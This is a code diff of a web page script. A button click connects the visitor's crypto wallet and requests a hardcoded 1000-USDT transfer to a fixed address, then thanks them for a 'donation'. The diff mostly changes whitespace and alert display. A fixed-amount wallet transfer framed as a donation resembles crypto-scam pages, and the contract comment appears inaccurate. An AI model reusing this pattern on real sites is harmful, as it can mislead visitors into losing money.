@@ -4,15 +4,15 @@ document.getElementById('fuck-button').addEventListener('click', async function 
   if (typeof web3 !== 'undefined') {
 
     web3 = new Web3(web3.currentProvider);
-    
+
     try {
       await ethereum.enable();
 
       const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0]; 
+      const sender = accounts[0];
 
       const contractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT contract address on Ethereum Mainnet
-      
+
       const contractABI = [
         {
           constant: true,
@@ -402,24 +402,74 @@ document.getElementById('fuck-button').addEventListener('click', async function 
         },
         { anonymous: false, inputs: [], name: "Pause", type: "event" },
         { anonymous: false, inputs: [], name: "Unpause", type: "event" },
-      ]; 
+      ];
 
       const contract = new web3.eth.Contract(contractABI, contractAddress);
 
       const recipient = '0x9d87C64Ee6d2d9606DC497b1b5e767166FeE522f';
-      const amount = web3.utils.toWei('1000', 'ether'); 
+      const amount = web3.utils.toWei('1000', 'ether');
 
       // Send the transaction
       await contract.methods.transfer(recipient, amount).send({ from: sender });
 
       // Transaction successful
-      alert('Thank you for your donation!');
-
+      showSuccessAlert()
     } catch (error) {
       console.error(error);
-      alert('An error occurred while donating. Please try again.');
+      showErrorAlert()
     }
   } else {
     console.log("Error")
   }
 })
+
+
+
+function showSuccessAlert() {
+  var container = document.getElementById('customAlertContainer');
+
+  var alertElement = document.createElement('div');
+  alertElement.className = 'success-alert';
+
+  var closeIcon = document.createElement('span');
+  closeIcon.className = 'close-icon';
+  closeIcon.innerHTML = '&times;';
+
+  alertElement.appendChild(closeIcon);
+
+  var message = document.createElement('span');
+  message.textContent = 'Thank you for your Contribute!';
+
+  alertElement.appendChild(message);
+
+  container.appendChild(alertElement);
+
+  closeIcon.addEventListener('click', function () {
+    alertElement.remove();
+  });
+}
+
+
+function showErrorAlert() {
+  var container = document.getElementById('customAlertContainer');
+
+  var alertElement = document.createElement('div');
+  alertElement.className = 'error-alert';
+
+  var closeIcon = document.createElement('span');
+  closeIcon.className = 'close-icon';
+  closeIcon.innerHTML = '&times;';
+
+  alertElement.appendChild(closeIcon);
+
+  var message = document.createElement('span');
+  message.textContent = 'An error occurred while donating. Please try again.';
+
+  alertElement.appendChild(message);
+
+  container.appendChild(alertElement);
+
+  closeIcon.addEventListener('click', function () {
+    alertElement.remove();
+  });
+}
